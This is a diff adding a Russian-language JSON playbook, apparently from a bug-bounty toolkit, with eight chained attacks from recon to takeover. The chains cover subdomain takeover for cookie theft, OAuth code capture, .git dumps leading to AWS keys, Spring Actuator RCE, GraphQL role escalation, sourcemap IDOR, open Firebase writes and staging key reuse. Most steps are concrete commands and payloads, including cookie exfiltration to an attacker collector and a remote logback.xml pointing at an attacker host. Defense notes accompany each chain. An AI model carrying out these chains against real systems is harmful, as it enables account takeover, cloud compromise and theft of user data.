@@ -1,0 +1,423 @@
+{
+  "domain": "Recon",
+  "domainLabel": "Recon → захват",
+  "domainOrder": 1.5,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "Мёртвый сабдомен, живой CSP: захват dangling-CNAME до кражи сессии",
+      "level": "advanced",
+      "impact": "Исполнение JS, которому доверяет основное приложение, кража сессионных cookie родительского домена и CSRF-токенов, полный угон сессии. Обычно (выше на auth/SSO-origin).",
+      "why": "Захват сам по себе не баг; мёртвый сабдомен всё ещё прописан в CSP script-src основного приложения и делит cookie-scope Domain=.example.com, поэтому его claim превращает low-находку dangling-DNS в доверенное исполнение кода на проде.",
+      "precondition": "CNAME указывает на незанятого провайдера (*.github.io, *.herokudns.com, bucket.s3.amazonaws.com, *.azurewebsites.net, *.fastly.net), И этот хост присутствует в CSP или cookie-scope основного приложения.",
+      "tags": [
+        "subdomain-takeover",
+        "csp-bypass",
+        "cookie-theft",
+        "session"
+      ],
+      "realWorld": "HackerOne 'A Guide To Subdomain Takeovers 2.0'; MetaMask subdomain takeover (HackerOne #1717626).",
+      "defense": "Непрерывно диффать висячие CNAME (dnsx -cname), убирать выведенные хосты из CSP-allowlist, использовать префикс cookie __Host-.",
+      "steps": [
+        {
+          "title": "Перечисляем сабдомены и резолвим CNAME",
+          "kind": "command",
+          "q": "subfinder",
+          "detail": "subfinder -d example.com -all | dnsx -cname -resp -silent"
+        },
+        {
+          "title": "Помечаем висячие и незанятые цели",
+          "kind": "script",
+          "q": "Mass subdomain takeover (CNAME -> fingerprint)",
+          "detail": "subjack -w hosts.txt -t 100 -ssl -c fingerprints.json -v  +  nuclei -t http/takeovers/ -l hosts.txt"
+        },
+        {
+          "title": "Клеймим ресурс у провайдера и поднимаем свой JS",
+          "kind": "note",
+          "q": "",
+          "detail": "register the exact-named GitHub Pages repo / S3 bucket / Azure app, then host attacker x.js"
+        },
+        {
+          "title": "Проверяем мёртвый хост в заголовке CSP",
+          "kind": "note",
+          "detail": "curl -sI https://app.example.com | grep -i content-security-policy  then look for the dead subdomain in script-src"
+        },
+        {
+          "title": "Грузим скрипт с доверенного origin",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "<script src=\"https://dead.example.com/x.js\"></script>  passes CSP because the origin is allowlisted"
+        },
+        {
+          "title": "Крадём cookie родительского домена и сессию",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "JS reads document.cookie or rides Domain=.example.com cookies and POSTs them to an attacker collector"
+        }
+      ]
+    },
+    {
+      "title": "Грязные танцы на висячем хосте: захват сабдомена → ATO через OAuth",
+      "level": "advanced",
+      "impact": "Полный захват аккаунта через перехват OAuth code/access_token или SSO-assertion; pre-account-takeover в масштабе. Обычно.",
+      "why": "Заклеймленный мёртвый сабдомен, попадающий в allowlist redirect_uri (или достижимый через same-site redirect), ловит authorization code прямо в потоке и превращает DNS-пыль из recon в ключи ко всем связанным аккаунтам.",
+      "precondition": "Захватываемый сабдомен зарегистрирован как валидный redirect_uri или reply URL OAuth-клиента цели, ЛИБО cookie domain-scoped и можно подбросить fixation-cookie с сабдомена.",
+      "tags": [
+        "subdomain-takeover",
+        "oauth",
+        "account-takeover",
+        "redirect-uri"
+      ],
+      "realWorld": "Frans Rosen 'Dirty Dancing in petite places'; Zoom OAuth/cookie-tossing ATO ($15k, 2024); GitPod cookie tossing CVE-2024-21583.",
+      "defense": "Точное сравнение redirect_uri (без wildcard), убирать выведенные хосты из allowlist, PKCE + response_mode=form_post, cookie __Host-.",
+      "steps": [
+        {
+          "title": "Картируем сабдомены и кандидатов на takeover",
+          "kind": "script",
+          "q": "Mass subdomain takeover (CNAME -> fingerprint)",
+          "detail": "subfinder -d example.com | httpx -silent | nuclei -t http/takeovers/"
+        },
+        {
+          "title": "Собираем конфиг OAuth-клиента и allowlist redirect",
+          "kind": "note",
+          "detail": "grep JS bundles for client_id, redirect_uri, response_type=token, /oauth/authorize"
+        },
+        {
+          "title": "Находим захватываемый хост внутри allowlist",
+          "kind": "checklist",
+          "q": "recon",
+          "detail": "cross-reference dangling hosts against the allowed reply URLs"
+        },
+        {
+          "title": "Клеймим висячий сабдомен и ставим перехватчик",
+          "kind": "note",
+          "q": "",
+          "detail": "register the unclaimed S3/Pages/Azure resource; host a page logging ?code=, fragment #access_token=, and postMessage data"
+        },
+        {
+          "title": "Готовим authorize-URL на мёртвый хост",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "https://idp.example.com/authorize?client_id={CLIENT_ID}&redirect_uri=https://dead.example.com/cb&response_type=code&scope=..."
+        },
+        {
+          "title": "Реплеим украденный code/token в сессию жертвы",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "exchange the stolen code at /oauth/token (Dirty Dancing response_type/response_mode confusion leaks fragment tokens cross-origin)"
+        }
+      ]
+    },
+    {
+      "title": "От /.git/HEAD к AWS root: утечка исходников → захват облака",
+      "level": "intermediate",
+      "impact": "Чтение/запись S3/RDS, перечисление и эскалация IAM, иногда полный захват облачного аккаунта или внутренней сети. Обычно по радиусу поражения.",
+      "why": "Кривой web-root тихо отдаёт всю папку .git; ты пересобираешь проприетарный исходник офлайн и достаёшь живые AWS-ключи из истории, которые удалили месяцы назад, но не ротировали.",
+      "precondition": "https://host/.git/HEAD возвращает 'ref: refs/heads/...' (листинг каталога не нужен, объекты тянутся напрямую).",
+      "tags": [
+        "git-exposure",
+        "source-code",
+        "aws",
+        "cloud-takeover",
+        "secrets"
+      ],
+      "realWorld": "'From .git directory to AWS EC2 network takeover' (alsolaiman); Appsecco 'Finding Treasures in Github and Exploiting AWS'.",
+      "defense": "Блокировать .git на web-сервере/CDN, ротация ключей на каждый commit (git-secrets pre-commit), least-privilege IAM, алерт на sts:GetCallerIdentity с новых ASN.",
+      "steps": [
+        {
+          "title": "Сканируем выставленный VCS-каталог",
+          "kind": "command",
+          "q": "nuclei",
+          "detail": "nuclei -t http/exposures/configs/git-config.yaml -l live.txt  (or curl -s https://host/.git/HEAD)"
+        },
+        {
+          "title": "Дампим и пересобираем репозиторий офлайн",
+          "kind": "note",
+          "detail": "git-dumper https://host/.git/ ./loot  (or GitTools gitdumper.sh + extractor.sh)"
+        },
+        {
+          "title": "Сканируем всю историю на секреты",
+          "kind": "script",
+          "q": "CI / repo secrets grep (AKIA / AIza / xox / ghp_ / .tfstate)",
+          "detail": "trufflehog filesystem ./loot --only-verified  and  gitleaks detect -s ./loot -v"
+        },
+        {
+          "title": "Достаём ключи из удалённых blob и старых коммитов",
+          "kind": "note",
+          "detail": "git rev-list --all | xargs -I{} git grep -I AKIA {}"
+        },
+        {
+          "title": "Безопасно валидируем облачный ключ",
+          "kind": "note",
+          "detail": "aws sts get-caller-identity  then  enumerate-iam --access-key ... --secret-key ..."
+        },
+        {
+          "title": "Перечисляем ресурсы и доказываем импакт",
+          "kind": "checklist",
+          "q": "cloud",
+          "detail": "aws s3 ls; aws iam list-attached-user-policies; prove read on one private object only; check privesc paths (iam:PassRole, CreatePolicyVersion), no bulk exfil"
+        }
+      ]
+    },
+    {
+      "title": "Кража heapdump: инфолик Spring Actuator → RCE",
+      "level": "advanced",
+      "impact": "Кража живых секретов (креды БД, облачные ключи, ключи подписи) и часто полный RCE. Обычно (уровень RCE).",
+      "why": "Инфолик /actuator/heapdump на деле полный снимок памяти JVM, который ты офлайн майнишь на живые креды, а доступный на запись /actuator/env цепляется в исполнение кода без всякой порчи памяти.",
+      "precondition": "Отвечает путь Actuator (/actuator, /actuator/health или легаси /heapdump, /env, /mappings); fingerprint это JSON с _links или {\"status\":\"UP\"}.",
+      "tags": [
+        "spring-actuator",
+        "heapdump",
+        "rce",
+        "secrets",
+        "management-interface"
+      ],
+      "realWorld": "Wiz 'Exploring Spring Boot Actuator Misconfigurations'; Maass 'Stealing Secrets Using Spring Actuators'; HackTricks Spring Actuators.",
+      "defense": "management.endpoints.web.exposure.include=health,info; вынести Actuator на отдельный непубличный порт за auth; вырезать env/heapdump/restart в проде.",
+      "steps": [
+        {
+          "title": "Находим эндпоинты Actuator",
+          "kind": "command",
+          "q": "nuclei",
+          "detail": "nuclei -t http/misconfiguration/springboot/ -u https://host  (or fuzz /actuator/{env,heapdump,mappings,gateway/routes})"
+        },
+        {
+          "title": "Тянем heap dump на диск",
+          "kind": "note",
+          "detail": "curl -s https://host/actuator/heapdump -o heap.hprof  (often hundreds of MB)"
+        },
+        {
+          "title": "Майним дамп на живые секреты",
+          "kind": "note",
+          "detail": "Eclipse MAT / VisualVM OQL, or  strings heap.hprof | grep -iE 'password|secret|AKIA|x-api-key|jdbc:'"
+        },
+        {
+          "title": "RCE A: инъекция env/Eureka в Spring Cloud",
+          "kind": "payload",
+          "q": "Insecure Deserialization",
+          "detail": "POST eureka.client.serviceUrl.defaultZone XStream gadget to /actuator/env then hit /actuator/refresh"
+        },
+        {
+          "title": "RCE B: подменяем logging.config на свой logback",
+          "kind": "payload",
+          "q": "Insecure Management Interface",
+          "detail": "POST logging.config=http://attacker/logback.xml to /actuator/env then /actuator/restart"
+        },
+        {
+          "title": "RCE C: H2 CREATE ALIAS через доступный datasource",
+          "kind": "payload",
+          "q": "Insecure Management Interface",
+          "detail": "set spring.datasource.url to an H2 mem DB and inject a Java stored procedure via CREATE ALIAS"
+        }
+      ]
+    },
+    {
+      "title": "Схема говорит admin: интроспекция GraphQL → эскалация привилегий",
+      "level": "intermediate",
+      "impact": "Самоповышение до админа, доступ к данным других тенантов, захват аккаунта через недокументированные мутации. Обычно.",
+      "why": "Интроспекция выдаёт полную недокументированную схему (внутренние setRole/impersonate-мутации, которые UI никогда не зовёт), а отсутствие authz на уровне resolver-а позволяет вызвать их напрямую.",
+      "precondition": "GraphQL-эндпоинт (/graphql, /api/graphql, /v1/graphql, Hasura/Apollo) отвечает на интроспекцию, либо включены подсказки полей 'did you mean' даже при выключенной интроспекции.",
+      "tags": [
+        "graphql",
+        "introspection",
+        "privilege-escalation",
+        "bola"
+      ],
+      "realWorld": "HackerOne 'How a GraphQL Bug Resulted in Authentication Bypass'; находка на HackerOne Ambassador World Cup 2023; PortSwigger GraphQL labs.",
+      "defense": "Отключить интроспекцию и подсказки полей в проде, enforce authz в каждом resolver (не на gateway), лимит глубины и батчинга, persisted queries.",
+      "steps": [
+        {
+          "title": "Находим GraphQL-эндпоинт",
+          "kind": "command",
+          "q": "nuclei",
+          "detail": "nuclei -t http/exposures/graphql-detect.yaml  (or probe {__typename})"
+        },
+        {
+          "title": "Выкачиваем полную схему",
+          "kind": "note",
+          "detail": "clairvoyance / graphql-cop / Burp InQL; if introspection is off, brute-force fields via suggestions"
+        },
+        {
+          "title": "Картируем мутации на дыры в authz",
+          "kind": "checklist",
+          "q": "graphql",
+          "detail": "flag updateUserRole, setIsAdmin, createInvite, impersonate, resetPassword(userId)"
+        },
+        {
+          "title": "Проверяем authz на уровне объекта (BOLA)",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "query{ user(id:\"VICTIM\"){ email tokens } }  with your own session"
+        },
+        {
+          "title": "Вызываем привилегированную мутацию напрямую",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "mutation{ updateUserRole(userId:\"<me>\", role:\"ADMIN\"){ ok } }"
+        },
+        {
+          "title": "Пивотим в ATO через мутацию смены email",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "mutation{ changeEmail(userId:\"VICTIM\", email:\"attacker@x\") }"
+        }
+      ]
+    },
+    {
+      "title": "Бандл это карта: майнинг JS → массовый IDOR",
+      "level": "intermediate",
+      "impact": "Массовое извлечение PII и записей других пользователей через недокументированные эндпоинты, иногда доступ к admin-API. Обычно за mass-IDOR.",
+      "why": "Sourcemap-ы и webpack-чанки раскрывают внутренние API-хосты, role-флаги и старые захардкоженные ключи, удалённые из текущего кода, но не ротированные, так что ты бьёшь по эндпоинтам, которые приложение нигде не рекламирует.",
+      "precondition": "Достижимые JS и sourcemap-ассеты (main.hash.js, *.js.map), что верно почти для любого SPA.",
+      "tags": [
+        "js-recon",
+        "sourcemap",
+        "idor",
+        "bola",
+        "api-key-leak"
+      ],
+      "realWorld": "'Hunting API Keys in JavaScript Files' (Medusa); jsmon JS-recon guide; многочисленные writeup-ы по sourcemap-IDOR.",
+      "defense": "Вырезать sourcemap из прода, ротировать любой ключ, когда-либо уехавший на клиент, enforce object-level authz на сервере, считать любой клиентский ключ публичным.",
+      "steps": [
+        {
+          "title": "Собираем исторические и живые URL-ы JS",
+          "kind": "command",
+          "q": "katana",
+          "detail": "gau example.com | grep '\\.js'  and  katana -u https://app.example.com -jc -d 3 -o js.txt"
+        },
+        {
+          "title": "Деминифицируем через открытые sourcemap",
+          "kind": "note",
+          "detail": "fetch *.js.map then  npx source-map-explorer / unpacker to restore names and paths"
+        },
+        {
+          "title": "Извлекаем эндпоинты и секреты",
+          "kind": "script",
+          "q": "JS mass scan (fetch -> endpoints + secrets -> dedup)",
+          "detail": "linkfinder -i main.js -o cli  and  trufflehog filesystem ./js --only-verified / SecretFinder"
+        },
+        {
+          "title": "Диффим эндпоинты, которые UI не зовёт",
+          "kind": "checklist",
+          "q": "recon",
+          "detail": "flag /api/internal/*, /admin/*, isAdmin, feature-flag and debug routes"
+        },
+        {
+          "title": "Тестим объектные эндпоинты на отсутствие authz",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "iterate GET /api/v2/users/{id}/invoices swapping {id} with your own token (BOLA)"
+        },
+        {
+          "title": "Дотягиваемся до закрытых данных stale-ключом",
+          "kind": "payload",
+          "q": "API Key Leaks",
+          "detail": "curl -H \"x-api-key: <leaked>\" https://api.example.com/internal/export"
+        }
+      ]
+    },
+    {
+      "title": "Конфиг внаглую: открытый Firebase → захват БД",
+      "level": "newbie",
+      "impact": "Неаутентифицированное чтение всех данных пользователей и, когда правила = true, запись/правка записей до захвата аккаунта, privilege-флагов и порчи данных. Обычно (критично при флипе поля isAdmin/role).",
+      "why": "Firebase-конфиг на виду в JS/APK это не баг; баг это ленивые правила '.read'/'.write': true, а трюк /.json превращает утечку конфига в неаутентифицированное чтение И запись прод-базы.",
+      "precondition": "В web-бандле или APK виден Firebase projectId/databaseURL (apiKey, project.firebaseio.com, project.firebasestorage.app).",
+      "tags": [
+        "firebase",
+        "misconfiguration",
+        "database-takeover",
+        "account-takeover"
+      ],
+      "realWorld": "Zego 'Firebase Database Takeover' (HackerOne #1065134); securitybreached 'Exploiting Insecure Firebase Database'; tauh33dkhan Insecure-Firebase repo.",
+      "defense": "Закрыть .read/.write за auth != null плюс проверки владения, ограничить Web API key, аудит правил Storage, не полагаться на секретность конфига.",
+      "steps": [
+        {
+          "title": "Достаём Firebase-конфиг из JS/APK",
+          "kind": "note",
+          "detail": "grep bundle for firebaseio.com / apiKey; for apps  apktool d app.apk  then grep google-services.json"
+        },
+        {
+          "title": "Проверяем чтение RTDB трюком REST",
+          "kind": "note",
+          "detail": "curl 'https://project.firebaseio.com/.json'  (200 + JSON = world-readable)"
+        },
+        {
+          "title": "Проверяем права на запись",
+          "kind": "note",
+          "detail": "curl -X PUT -d '{\"pwn\":true}' 'https://project.firebaseio.com/test.json'"
+        },
+        {
+          "title": "Самопровижн аккаунта через Identity Toolkit",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "signupNewUser via identitytoolkit.googleapis.com?key=<apiKey>  when email/password auth is open"
+        },
+        {
+          "title": "Флипаем privilege-поле на записи",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "PATCH /users/<uid>.json setting \"role\":\"admin\" / \"isPremium\":true"
+        },
+        {
+          "title": "Читаем чувствительную коллекцию для пруфа",
+          "kind": "checklist",
+          "q": "api-key-leaks",
+          "detail": "data-exposure proof gate: count records, screenshot one; report the exact insecure rule + least-privilege fix"
+        }
+      ]
+    },
+    {
+      "title": "Дверь в staging: забытый хост + Swagger → абуз общего ключа",
+      "level": "intermediate",
+      "impact": "Доступ к прод-данным через слабее защищённого близнеца плюс абуз общего ключа SendGrid/Stripe/Twilio (фишинг от доверенного отправителя, мошеннические списания, эксфил PII). Обычно, когда ключи общие с продом.",
+      "why": "Это финал из нескольких артефактов: забытый staging./dev.-хост с включённым debug и слабой авторизацией отдаёт API-доки, которые вручают реальный общий с продом интеграционный ключ, и три low-находки складываются в один critical.",
+      "precondition": "Резолвится непрод-хост (staging., dev., uat., preprod., qa. или *.internal., засветившийся в SAN сертификата или CT-логах) и отдаёт доки либо debug.",
+      "tags": [
+        "staging",
+        "swagger",
+        "api-key-leak",
+        "credential-reuse",
+        "secrets"
+      ],
+      "realWorld": "keyhacks (streaak); Cybernews 'MailChimp, Mailgun, Sendgrid API leak'; распространённые writeup-ы по staging/Swagger BOLA.",
+      "defense": "Держать непрод вне публичного интернета (IP-allowlist/VPN), уникальные ключи на окружение, выключить Swagger/Actuator/DEBUG везде с доступом из интернета, мониторить использование стороннего ключа по source IP.",
+      "steps": [
+        {
+          "title": "Вытаскиваем непрод-хосты из CT-логов и пермутаций",
+          "kind": "command",
+          "q": "dnsx",
+          "detail": "crt.sh?q=%25.example.com piped to dnsx, plus dnsgen/gotator permutations resolved with puredns"
+        },
+        {
+          "title": "Щупаем слабую авторизацию и debug-тумблеры",
+          "kind": "checklist",
+          "q": "recon",
+          "detail": "staging-hardening gate: default creds, no WAF, ?debug=true, Django DEBUG=True traceback, phpinfo()"
+        },
+        {
+          "title": "Находим API-доки и коллекции",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://staging.example.com/FUZZ -w api-docs.txt  for /swagger.json, /openapi.json, /v2/api-docs, *.postman_collection.json, /actuator"
+        },
+        {
+          "title": "Импортируем спеку и автостроим запросы",
+          "kind": "script",
+          "q": "OpenAPI / Swagger mass tester (path x method)",
+          "detail": "load openapi.json into Burp/Postman; enumerate every operation incl. undocumented admin ones"
+        },
+        {
+          "title": "Собираем секреты со staging-поверхности",
+          "kind": "note",
+          "detail": "pull SENDGRID_API_KEY / STRIPE_SECRET / TWILIO_AUTH from /actuator/env, .env, or traceback locals"
+        },
+        {
+          "title": "Валидируем ключ и проверяем, общий ли он с продом",
+          "kind": "payload",
+          "q": "API Key Leaks",
+          "detail": "keyhacks: curl -H 'Authorization: Bearer SG.<key>' https://api.sendgrid.com/v3/scopes ; curl https://api.stripe.com/v1/charges -u sk_live_<key>:  then constrained PoC abuse, no spam; pivot reused creds to prod"
+        }
+      ]
+    }
+  ]
+}
